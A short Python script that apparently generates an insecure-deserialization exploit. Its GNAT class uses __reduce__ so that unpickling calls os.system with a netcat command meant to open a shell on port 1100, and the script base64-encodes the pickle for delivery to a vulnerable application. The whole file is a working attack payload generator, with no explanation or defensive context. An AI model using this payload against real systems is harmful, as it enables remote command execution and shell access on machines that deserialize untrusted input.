import pickle
import base64
import subprocess
import os


class GNAT:
    def __reduce__(self):
        return (os.system, ('netcat -e localhost 1100',))


serialized = pickle.dumps(GNAT())

encode = base64.urlsafe_b64encode(serialized).decode()

print(encode)